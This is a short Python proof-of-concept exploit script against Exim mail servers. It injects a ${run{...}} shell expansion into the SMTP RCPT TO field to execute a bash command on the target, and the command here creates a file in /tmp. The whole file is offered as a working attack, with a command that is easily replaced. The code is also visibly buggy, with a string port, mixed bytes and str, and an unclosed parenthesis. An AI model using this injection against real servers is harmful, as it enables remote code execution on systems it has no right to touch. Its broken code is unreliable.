#!/usr/bin/env python                                                                                                                  

import socket
import sys


if len(sys.argv) != 3:
    print("Usage: eximrce.py <SERVER> <PORT>")
    sys.exit(0)

## create a socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    ## connect to server
    server = sys.argv[1]
    port = sys.argv[2]
    print('Connecting to: {}'.format(server))
    connect = s.connect((sys.argv[1], sys.argv[2]))
    # receive the welcome banner
    reply = s.recv(1024)
    print(reply)
    ## send EHLO
    s.send('EHLO lwtest.com' + '\r\n')
    reply = s.recv(1024) 
    print(reply)
    ## send mail from
    s.send('MAIL FROM:<>' + '\r\n')
    reply = s.recv(1024)
    print(reply)
    ## send rcpt to
    ## attack string
    payload = r'root+${run{\x2fbin\x2fbash\x20\x2dc\x20\x22touch\x20\x2ftmp\x2feximrce\x22\x20\x26}}@' + server
    s.send('RCPT TO:' + payload + '\r\n')
    reply = s.recv(1024)
    print(reply)
    ## send data
    s.send('DATA' + '\r\n')
    reply = s.recv(1024)
    print(reply)
    s.send('msgPayload' + '\r\n')
    s.send('.' + '\r\n')
    print('Finished.')
except:
    print('Cannot connect to {}'.format(server)
